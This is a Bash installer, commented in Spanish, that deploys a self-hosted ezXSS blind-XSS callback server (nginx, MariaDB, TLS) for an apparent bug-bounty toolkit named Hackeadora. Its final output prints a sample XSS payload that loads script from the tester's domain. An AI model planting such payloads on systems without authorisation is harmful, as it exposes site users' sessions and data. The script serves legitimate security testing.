#!/usr/bin/env bash
# ============================================================
#  mcp/blindxss/setup_ezxss.sh
#  Instala EZXSS self-hosted para Blind XSS en bug bounty
#
#  EZXSS: https://github.com/ssl/ezXSS
#  Requiere: PHP, MySQL/MariaDB, dominio/subdominio propio
#            con HTTPS (Let's Encrypt)
#
#  Uso: sudo bash setup_ezxss.sh
# ============================================================

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

ok()   { echo -e "${GREEN}[✓]${RESET} $*"; }
info() { echo -e "${CYAN}[→]${RESET} $*"; }
warn() { echo -e "${YELLOW}[!]${RESET} $*"; }
fail() { echo -e "${RED}[✗]${RESET} $*"; exit 1; }

echo -e "${BOLD}${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║   Hackeadora — EZXSS Self-Hosted Setup   ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${RESET}"

[[ "$(id -u)" -ne 0 ]] && fail "Ejecuta con sudo"

# ── Variables ─────────────────────────────────────────────────
INSTALL_DIR="/opt/ezxss"
WEB_DIR="/var/www/ezxss"
INSTALL_USER="${SUDO_USER:-www-data}"

echo -e "${CYAN}[?] Dominio para EZXSS (ej: xss.tudominio.com):${RESET}"
read -r EZXSS_DOMAIN
[[ -z "$EZXSS_DOMAIN" ]] && fail "Dominio requerido"

echo -e "${CYAN}[?] Email para Let's Encrypt:${RESET}"
read -r LE_EMAIL

echo -e "${CYAN}[?] Password de admin para EZXSS:${RESET}"
read -rs EZXSS_PASS
echo ""
[[ -z "$EZXSS_PASS" ]] && fail "Password requerida"

# ── 1. Dependencias ───────────────────────────────────────────
info "Instalando dependencias..."
apt-get update -qq
apt-get install -y nginx php php-mysql php-curl php-json \
  mariadb-server certbot python3-certbot-nginx git 2>/dev/null
ok "Dependencias instaladas"

# ── 2. MySQL ──────────────────────────────────────────────────
info "Configurando MySQL..."
systemctl start mariadb 2>/dev/null || true

EZXSS_DB_PASS=$(openssl rand -base64 16 | tr -d '=+/')
mysql -e "CREATE DATABASE IF NOT EXISTS ezxss CHARACTER SET utf8mb4;" 2>/dev/null
mysql -e "CREATE USER IF NOT EXISTS 'ezxss'@'localhost' IDENTIFIED BY '${EZXSS_DB_PASS}';" 2>/dev/null
mysql -e "GRANT ALL ON ezxss.* TO 'ezxss'@'localhost';" 2>/dev/null
mysql -e "FLUSH PRIVILEGES;" 2>/dev/null
ok "MySQL configurado (db: ezxss, user: ezxss)"

# ── 3. EZXSS ─────────────────────────────────────────────────
info "Instalando EZXSS..."
[[ -d "$WEB_DIR" ]] && rm -rf "$WEB_DIR"
git clone -q https://github.com/ssl/ezXSS.git "$WEB_DIR"
chown -R www-data:www-data "$WEB_DIR"
chmod -R 755 "$WEB_DIR"

# Configurar EZXSS
cat > "$WEB_DIR/app/Config.php" << PHPEOF
<?php
define('DBHOST', 'localhost');
define('DBNAME', 'ezxss');
define('DBUSER', 'ezxss');
define('DBPASS', '${EZXSS_DB_PASS}');
define('DOMAINNAME', '${EZXSS_DOMAIN}');
define('DEFAULTPASSWORD', '${EZXSS_PASS}');
PHPEOF
ok "EZXSS instalado en $WEB_DIR"

# ── 4. Nginx ──────────────────────────────────────────────────
info "Configurando Nginx para $EZXSS_DOMAIN..."
cat > "/etc/nginx/sites-available/ezxss" << NGINXEOF
server {
    listen 80;
    server_name ${EZXSS_DOMAIN};
    root ${WEB_DIR}/public;
    index index.php;

    location / {
        try_files \$uri \$uri/ /index.php?\$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
    }

    # Endpoint de callback para Hackeadora
    location ~ ^/([a-f0-9]{8})\.js$ {
        try_files \$uri /index.php?\$query_string;
    }

    access_log /var/log/nginx/ezxss.log;
    error_log  /var/log/nginx/ezxss_error.log;
}
NGINXEOF

ln -sf /etc/nginx/sites-available/ezxss /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx
ok "Nginx configurado"

# ── 5. Let's Encrypt ──────────────────────────────────────────
info "Obteniendo certificado SSL para $EZXSS_DOMAIN..."
certbot --nginx -d "$EZXSS_DOMAIN" \
  --non-interactive \
  --agree-tos \
  --email "$LE_EMAIL" \
  2>/dev/null && ok "SSL configurado" || warn "SSL falló — configura manualmente"

# ── 6. Guardar config en Hackeadora ───────────────────────────
ROOT_DIR="$(dirname "$(dirname "$(realpath "$0")")")"
ENV_FILE="$ROOT_DIR/.env"
[[ ! -f "$ENV_FILE" ]] && ENV_FILE="$ROOT_DIR/config.env"

{
  grep -v "EZXSS_" "$ENV_FILE" 2>/dev/null || true
  echo "EZXSS_URL=https://${EZXSS_DOMAIN}"
  echo "EZXSS_DOMAIN=${EZXSS_DOMAIN}"
  echo "EZXSS_DB_PASS=${EZXSS_DB_PASS}"
} > "${ENV_FILE}.tmp" && mv "${ENV_FILE}.tmp" "$ENV_FILE"
ok "Configuración guardada en $ENV_FILE"

echo ""
echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${GREEN}║   EZXSS instalado correctamente          ║${RESET}"
echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════╝${RESET}"
echo ""
echo "  Panel: https://${EZXSS_DOMAIN}/manage"
echo "  Pass:  ${EZXSS_PASS}"
echo ""
echo "  Hackeadora generará payloads como:"
echo "  <script src=\"https://${EZXSS_DOMAIN}/a3f7b2c1.js\"></script>"
echo ""
echo "  Cada payload_id identifica: dominio + subdominio + campo"
